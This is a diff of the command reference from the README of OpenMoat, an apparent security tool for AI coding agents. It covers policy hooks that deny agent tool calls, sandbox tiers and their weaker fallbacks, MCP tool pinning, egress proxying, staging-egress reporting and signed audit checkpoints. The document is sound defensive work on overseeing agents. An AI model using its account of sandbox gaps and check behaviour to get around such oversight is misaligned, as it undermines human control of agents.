+| `openmoat status [--format json]` · `openmoat doctor [--accept] [--verbose]` | check the installation and each agent's protection level · list drift and re-pin (`--verbose` lists every check with its paths, each agent's known gaps and where each sandbox is stricter or wider than the policy); `doctor` also prints the protection score of each `openmoat run` tier this system can start and of the hook alone ([above](#how-each-agent-is-protected)), the audit log's checkpoint public key and whether its newest checkpoint verifies ([signed checkpoints](#check-that-the-audit-log-was-not-changed)), and the other hooks waiting for `openmoat hooks accept` |
 | `openmoat doctor --bundle <file> [--bundle-events N]` | write one local file for a bug report: version, system, agents, policy findings, the checks and the last N decisions without their commands or paths; nothing is sent ([Report a bug](#report-a-bug)) |
 | `openmoat show [id] [--session …] [--since …] [--recent N]` | see events |
 | `openmoat watch [--host …] [--only deny\|review] [--session …] [--recent N] [--no-follow]` | follow the agents' calls live, one line each; reads the audit log only ([Watch the agents live](#watch-the-agents-live)) |
 | `openmoat why [--last \| <id> \| HH:MM[:SS]] [--format json]` | explain one deny or review: its rules and where they are, how the policy decides the call now, the context, and how to change it ([Why was this blocked?](#why-was-this-blocked)) |
 | `openmoat serve [--listen 127.0.0.1:<port>]` | see `status`, `show`, `report` and `why` in a browser on this machine: 127.0.0.1 only, a link with a token made for this run, read-only; person-only ([In a browser](#in-a-browser)) |
-| `openmoat replay --since today` · `openmoat report --since 7d` | per-session timeline · summary, with the sends after collecting outside the project per session and per active hour (recorded only, [POLICY.md §4.5](POLICY.md#45-staging-data-sent-after-collection-recorded)) |
+| `openmoat replay --since today` · `openmoat report --since 7d` | per-session timeline · summary, with the sends after collecting outside the project per session and per active hour (the `collected` trigger, recorded only; packed files and private data written to a file are reviewed, `staging-egress`, [POLICY.md §4.5](POLICY.md#45-staging-data-sent-after-collection)) |
 | `openmoat audit export [--since …] [--host …] [--session …]` | write events to stdout as JSON Lines with their chain hashes, for `audit verify` and `audit report` |
 | `openmoat audit verify <file> [--anchor <hash>] [--require-anchor]` | check an export without the database; print its head hash; without `--anchor` the result says "not anchored", and `--require-anchor` fails it; on the machine whose audit key made the lines, also check each line's MAC |
 | `openmoat audit anchor --git <repo>` · `--file <path>` | record the log's head outside it: a commit on `refs/moat/anchors` in that repository, or a line appended to that file; nothing is sent anywhere (terminal only) |
 | `openmoat audit verify --against <repo or file>` | check the log against every anchor recorded there; fails, naming the first anchor whose event is gone or changed |
+| `openmoat audit checkpoint [--new-key] [--format json]` | sign a checkpoint of the log now (C2SP signed note: tree size, Merkle root) with the audit signing key, made when missing; `--new-key` starts a new key and keeps the old one (terminal only) |
+| `openmoat audit verify [<file>] --checkpoint <file> --pubkey <key or file>` | check a signed checkpoint without the audit key: its signature, then that the export (or, with no file, this machine's log) still holds the events it covers, unchanged |
 | `openmoat audit report <file>…` | one report over verified exports from several machines |
 | `openmoat audit deliver status` · `test [--sink <id>]` · `flush` (each `[--format json]`) | live delivery to the sinks in `~/.moat/delivery.yaml`: each sink's progress and last failure · one test record to each sink · deliver now, resuming a paused sink; exit 64 when the file is not honoured, a test is not accepted or a flush stopped ([DELIVERY.md](DELIVERY.md)) |
 | `openmoat audit evidence [--since …] [--until …] [--host …] [--samples N] [--format json]` | evidence for a window per control of OWASP Top 10 for LLM Applications 2025, SOC 2 and ISO/IEC 27001:2022 Annex A: rules that fired, decisions by verdict, redacted samples, the chain head, and the policy, lock and protections now; evidence, not a certification ([COMPLIANCE.md](COMPLIANCE.md)) |
@@ -1141,32 +1475,88 @@ reads `~`. The file must not exist yet, and an agent cannot run it.
 | `openmoat proxy ca init` | make the CA the proxy decrypts HTTPS with, for the hosts of `tls: terminate` secrets and of `requests:` entries without `hook_only` only (`openmoat run`'s proxy, and the standalone one for Claude Code sessions it gives the CA, [POLICY.md](POLICY.md) §2.3); shows what it covers and asks, then pins it. Again to rotate it or cover a new host. Person-only |
 | `openmoat secret list [--format json]` | each brokered secret's host, header and where its value is read from (never the value), and whether a deny rule keeps the agent from reading it there |
 | `openmoat trust [<repo>] [--revoke]` | let a repository's `.moat/policy.yaml` allow, until the file changes; it shows the file, its digest and every rule it adds, and asks `Trust this file? [y/N]` first |
+| `openmoat hooks list` | list the hook commands, plugin hooks, program-running settings and git programs the agents load besides OpenMoat's hook, and what waits for `openmoat hooks accept`; exits 64 while something waits |
+| `openmoat hooks accept` | review each new or changed one, with the shell classifier's verdict, and record it; until then `openmoat status` names it, and the calls of the agent that loads it are denied when that verdict is deny (held for review for any, with `hooks.foreign: hold`) ([ADR-109](adr/ADR-109-foreign-hook-ledger-and-fail-safe-hooks.md)) |
 | `openmoat mcp accept [<server>]` | review a changed or new MCP server definition, or tools `openmoat mcp proxy` holds, and accept them; until then that server's tool calls are refused |
-| `openmoat mcp wrap [<server>…] [--sandbox \| --no-sandbox] [--dry-run]` · `openmoat mcp unwrap [<server>…]` | run stdio MCP servers through `openmoat mcp proxy`, which starts one only from a definition a person accepted, in `openmoat run`'s sandbox by default where it can sandbox (`--no-sandbox` opts out; a rewrap keeps the choice unless a flag is given), pins each tool's title, description, input and output schemas and annotations and hides one that changed or that nobody accepted yet, every tool of a server it has not seen included · point them back; `openmoat init --mcp-proxy` wraps every one, `openmoat uninstall` unwraps them ([ADR-026](adr/ADR-026-mcp-server-and-tool-pinning.md), [ADR-032](adr/ADR-032-mcp-proxy-holds-first-sight.md)) |
+| `openmoat mcp wrap [<server>…] [--sandbox \| --no-sandbox] [--dry-run]` · `openmoat mcp unwrap [<server>…]` | run stdio MCP servers through `openmoat mcp proxy`, which starts one only from a definition a person accepted, in `openmoat run`'s sandbox by default where it can sandbox, not on Windows, whose preview tier needs `--sandbox` (`--no-sandbox` opts out; a rewrap keeps the choice unless a flag is given), pins each tool's title, description, input and output schemas and annotations and hides one that changed or that nobody accepted yet, every tool of a server it has not seen included · point them back; `openmoat init --mcp-proxy` wraps every one, `openmoat uninstall` unwraps them ([ADR-026](adr/ADR-026-mcp-server-and-tool-pinning.md), [ADR-032](adr/ADR-032-mcp-proxy-holds-first-sight.md)) |
 | `openmoat mcp proxy --server <name> [--host <agent>] [--sandbox] [--write PATH]… -- <command>` | the wrapper `openmoat mcp wrap` writes into the agent's configuration; the agent starts it, you do not. `--host` names the agent whose file starts it: only that agent's hook decisions let its calls through (a server wrapped before this option existed gets it the next time you run `openmoat mcp wrap`). It starts the server only when this command line is the one an accepted definition gives; otherwise it answers every request with an error naming `openmoat mcp accept <name>` and exits 1 ([ADR-049](adr/ADR-049-mcp-startup-gate.md)) |
 | `openmoat policy lint` · `openmoat policy check "<action>" [--kind shell\|fs-read\|fs-write\|net\|fetch\|mcp]` · `openmoat policy compile` | validate a policy · test an action against it · print what the OS layers enforce |
 | `openmoat policy check-diff [--base <rev> [--head <rev>]] [--policy <file>] [--format text\|json\|github]` | check a change before it is merged: from `--base` to `--head` (`HEAD`), or a unified diff on stdin; exit 0 nothing found, 2 something the policy denies, 3 something for review ([MERGE_CHECK.md](MERGE_CHECK.md)); `--provenance review\|info\|off` (default `review`) shows what provenance notes say agents wrote in the change, never changing the exit code |
 | `openmoat provenance [--range <rev-range>] [--write-notes] [--verify] [--format text\|json]` | which files and lines of commits an agent session wrote, from this machine's audit log, and whether it had read untrusted content first · keep a note per commit on `refs/notes/openmoat` (person-only) · check those notes against the log (exit 64 on a mismatch) ([PROVENANCE.md](PROVENANCE.md)) |
-| `openmoat policy upgrade [--dry-run] [--diff] [--yes] [--undo]` | add what a new release's default policy changed, keeping your edits · undo the last upgrade |
+| `openmoat policy diff OLD NEW [--widen] [--fixtures FILE]… [--format text\|json]` | the rules and settings that changed; with `--widen`, every call the new policy decides less strictly, and what was proven; exit 0 nothing widens, 2 something does, 3 a setting changed that is not ranked (docs/POLICY.md §8.3) |
+| `openmoat policy upgrade [--dry-run] [--diff] [--yes] [--accept-widening] [--undo]` | add what a new release's default policy changed, keeping your edits; one that widens only with `--accept-widening` · undo the last upgrade |
 | `openmoat policy migrate [--file PATH] [--dry-run] [--yes]` | rewrite a policy in the current policy schema, changing no rule; keeps `<file>.before-migrate` (docs/POLICY.md §1.1) |
 | `openmoat policy trust-key <key.pub> --name <who>` | trust an SSH public key to sign policy packs (and signed repository policies, where the policy asks for them); signatures are made with `ssh-keygen -Y sign -n openmoat-pack` for a pack and `-n openmoat-repo-policy` for a repository policy |
 | `openmoat policy install <pack.yaml> [--sig <file>] [--name <name>]` · `openmoat policy remove <name>` | install a signed policy pack after its signature verifies; its rules apply as `pack:<name>:<id>` · take it out again |
 | `openmoat sandbox show` · `openmoat sandbox sync` | see the host sandbox settings the policy compiles to · write and re-pin them for the agents whose hook is installed |
 | `openmoat bench [--host …] [--hook <command>] [--verbose] [--format json]` | send the bundled MoatBench scenarios to OpenMoat in a throwaway home, or to any hook command with `--hook` and `--host`, and print the scorecard; the scenarios' commands never run ([MOATBENCH.md](MOATBENCH.md#reproduce-it-openmoat-bench)) |
 | `openmoat bench --report [--host …] [--scratch-dir DIR] [--format json\|markdown]` | the proof report: each security promise per layer (policy decision, host model from OpenMoat's golden payloads, real host, OS sandbox, network boundary) as PASS, FAIL or NOT TESTED HERE with the reason; the OS rows run the attacks under `openmoat run` in the throwaway home; exits 1 when an exercised layer fails ([MOATBENCH.md](MOATBENCH.md#proof-report-openmoat-bench---report)) |
-| `openmoat run [--isolate\|--no-isolate] [--write PATH]… [--netns auto\|require] [--env NAME]… [--verbose] -- <agent> [args]` | run an agent in a sandbox generated from the policy; `--env NAME` passes one inherited variable on for this run under `require.run: full-boundary` ([POLICY.md §9.3](POLICY.md#93-requiring-openmoat-runs-full-boundary-requirerun)) (macOS, Linux); on Linux the Isolated tier (bubblewrap: only the project, the read roots and temp) is the default where bubblewrap works, and elsewhere it says why and starts the Lightweight tier, which covers less of the project (without bubblewrap it is granted entry by entry and nothing can be created at its top, ADR-090); `--isolate` refuses instead of falling back, `--no-isolate` starts the Lightweight tier and records it in the audit log ([SANDBOX.md](SANDBOX.md#which-tier-openmoat-run-starts)); `--netns=require` refuses to start on Linux where the agent cannot get a network namespace of its own, instead of restricting its network by port only ([SANDBOX.md](SANDBOX.md)) |
+| `openmoat run [--isolate\|--no-isolate] [--write PATH]… [--netns auto\|require] [--scrub-env] [--env NAME]… [--verbose] -- <agent> [args]` | run an agent in a sandbox generated from the policy; `--scrub-env` passes on only an allowlist of your environment for this run, as `sandbox.env: scrubbed` does for every run, and `--env NAME` passes one more inherited variable on when the environment is scrubbed ([POLICY.md §9.6](POLICY.md#96-the-environment-openmoat-run-passes-on-sandboxenv)) (macOS, Linux; on Windows a preview tier that refuses writes outside the project, the temp directory and `--write` paths with a write-restricted token and ends the agent's processes with a job, while reads and the network are not held by the OS and batch files are not started, [SANDBOX.md](SANDBOX.md#openmoat-run-on-windows-preview-writes-only)); on Linux the Isolated tier (bubblewrap: only the project, the read roots and temp) is the default where bubblewrap works, and elsewhere it says why and starts the Lightweight tier, which covers less of the project (without bubblewrap it is granted entry by entry and nothing can be created at its top, ADR-090); `--isolate` refuses instead of falling back, `--no-isolate` starts the Lightweight tier and records it in the audit log ([SANDBOX.md](SANDBOX.md#which-tier-openmoat-run-starts)); `--netns=require` refuses to start on Linux where the agent cannot get a network namespace of its own, instead of restricting its network by port only ([SANDBOX.md](SANDBOX.md)); with `sandbox.strict: true` in your policy it starts only with its whole protection score, refusing (exit 64) before anything starts and stopping the agent when the check after the start cannot confirm a feature ([POLICY.md §9.7](POLICY.md#97-strict-mode-sandboxstrict)) |
 | `openmoat run … --no-snapshot` | take no snapshot of the project before the agent starts and after it exits (recorded in the audit log) |
-| `openmoat run … --print-boundary [--format json] -- <agent>` | print the sandbox boundary this run would start with and start nothing: the tier asked for and the one that starts, each downgrade with why, the network mode, the Landlock ABI, whether tool commands get the relay token, and each restriction's available / configured / applied / tested; every run writes the same record, completed by the check after the agent started, to the audit log (`run-boundary`), and on Linux stops an agent whose `/proc` status lacks `NoNewPrivs: 1` or `Seccomp: 2` ([SANDBOX.md](SANDBOX.md#the-runs-boundary-record), [ADR-089](adr/ADR-089-run-boundary-record.md)) |
+| `openmoat run … --print-boundary [--format json] -- <agent>` | print the sandbox boundary this run would start with and start nothing: the tier asked for and the one that starts, each downgrade with why, the network mode, the Landlock ABI, whether tool commands get the relay token, which inherited variables pass and which are withheld (names only, ADR-105), and each restriction's available / configured / applied / tested, and the protection score (`score`: the kernel features in force, weighted to 100, each missing one named, ADR-108); with `sandbox.strict: true` it prints the plan and then refuses, exit 64, when the score is not whole; every run writes the same record, completed by the check after the agent started, to the audit log (`run-boundary`), and on Linux stops an agent whose `/proc` status lacks `NoNewPrivs: 1` or `Seccomp: 2` ([SANDBOX.md](SANDBOX.md#the-runs-boundary-record), [ADR-089](adr/ADR-089-run-boundary-record.md)) |
 | `openmoat snapshot` · `--list [--format json]` · `--prune` | take a snapshot of the project's files · list them with what each left out · remove those past the retention (50 per project, 14 days); refused when an agent started it ([Put the project's files back](#put-the-projects-files-back)) |
 | `openmoat restore [<id>] [--patch] [-- <path>…]` | put the project's files back as a snapshot holds them, by default the newest one `openmoat run` took before its agent started: takes an undo snapshot, shows each change and asks first; person-only ([ADR-085](adr/ADR-085-workspace-snapshot-and-restore.md)) |
 | `openmoat proxy [--listen 127.0.0.1:<port>]` | run the egress proxy on its own; it serves only requests with a session credential (Claude Code's sessions get one from their `SessionStart` hook) unless `sandbox.proxy_serve_without_credential` is set; an allowed host is reached on ports 443 and 80 unless a `net` or `fetch` rule names `host:port`, and a plain-HTTP secret goes to port 80 unless it sets `port` ([POLICY.md](POLICY.md#52-openmoat-proxy)) |
 | `openmoat proxy install` · `uninstall` · `status [--format json]` | run `openmoat proxy` as a user service (macOS launchd user agent, Linux systemd user unit) so it stays up; `status` reports not installed / stopped / running / drift-blocked / crashlooping. `install` and `uninstall` are person-only: run them in a terminal of your own. Not supported on Windows yet (#272) |
 | `openmoat guard --host <id> --home <dir>` | the hook entry point; agents call it, you do not. `--home` is the state directory `openmoat init` wrote into the hook; a `MOAT_HOME` that names another one makes it deny. OpenMoat's plugins also run it with `--heartbeat` as they load ([above](#did-the-agent-load-openmoats-plugin)) |
 
+When the agent closes `openmoat mcp proxy`'s input, the server has 5 seconds to close
+its output and 5 more to exit, time enough for a server started under `openmoat run`; one that does not, or one whose output can no longer be passed
+on, is sent `SIGTERM` (to its process group, on Unix), killed 5 seconds later if it
+is still running, and the proxy exits 1 with the reason on standard error (ADR-107).
+On Unix the server runs in its own process group, so what it started is stopped
+with it. If you run `openmoat mcp proxy` by hand in a terminal, Ctrl-C stops the
+proxy but does not reach the server: the server sees its input close.
+
+### `init` for scripts: hooks only and JSON
+
+`openmoat init --hooks-only` writes and pins the agents' hooks and nothing else: no
+agent sandbox, no MCP step (the server definitions are neither pinned nor wrapped)
+and no opt-in question. Over a readable lock the other agents' pins, the MCP pins
+and the sandbox pins stay as they are, and the chosen agents' hook files are added;
+without a lock, or with one that cannot be read, every installed hook is pinned, as
+a plain `init` does. A server the lock does not pin yet waits for `openmoat mcp
+accept`. It cannot be combined with `--mcp-proxy`.
+
+`openmoat init --format json` prints one JSON document on standard output instead of
+the text. A script cannot answer a question it does not see, so it asks none: it
+needs `--hosts`, `--yes` or `--dry-run` and is refused (exit 64, nothing written)
+without one, and it never asks about the MCP servers or the opt-in choices.
+
+```
+openmoat init --hooks-only --hosts codex --format json
+```
+
+```json
+{
+  "version": "0.25.0", "dry_run": false, "hooks_only": true,
+  "home": "/Users/you/.moat", "binary": "/usr/local/bin/openmoat",
+  "binary_sha256": "<the hash the lock records>",
+  "lock_path": "/Users/you/.moat/policy.lock", "policy_path": "/Users/you/.moat/policy.yaml",
+  "environment_path": "/Users/you/.moat/environment.json",
+  "changed": true, "lock_entries_count": 14, "policy_update": null,
+  "hosts": [{
+    "host": "codex", "name": "Codex", "config_dir": "/Users/you/.codex",
+    "settings_path": "/Users/you/.codex/hooks.json", "extra_files": [],
+    "managed_files": ["/Users/you/.codex/hooks.json"], "events": ["PreToolUse", "…"],
+    "outcome": "installed", "changed": true, "backup_path": null, "trust_note": "…"
+  }],
+  "protection": [{ "host": "codex", "level": "hook-only", "…": "as `openmoat status --format json`" }]
+}
+```
+
+`outcome` is `installed`, `updated` or `unchanged`; `backup_path` is where your own
+hook file was moved, for an agent that runs one file. A dry run has
+`lock_entries_count: null`, no `protection`, and the hash of the binary as it is now.
+
 Exit codes: 0 allow or success, 1 the program `openmoat run` or `openmoat mcp proxy` started
 exited non-zero, or `openmoat mcp proxy` refused to start the server, or a layer `openmoat bench
---report` exercised failed, 2 deny,
-3 unresolved review (`policy check`) or a change for review (`policy check-diff`), 64 usage or
-configuration error. `openmoat guard` never
+--report` exercised failed, 2 deny, a change the policy denies (`policy check-diff`, `diff-widens`
+among them) or a widening (`policy diff --widen`),
+3 unresolved review (`policy check`), a change for review (`policy check-diff`), a widening
+upgrade without `--accept-widening` or a setting change not ranked (`policy diff --widen`), 64 usage or
+configuration error, something that needs you (`status`, `doctor`; `hooks list` while a hook
+waits for `openmoat hooks accept`), a checkpoint or export that does not verify (`audit verify
+--checkpoint`), or a run `sandbox.strict` refuses. `openmoat guard` never
 exits 64: it denies with exit 2 instead, so a broken hook blocks rather than fails open
 (ADR-004, ADR-015).
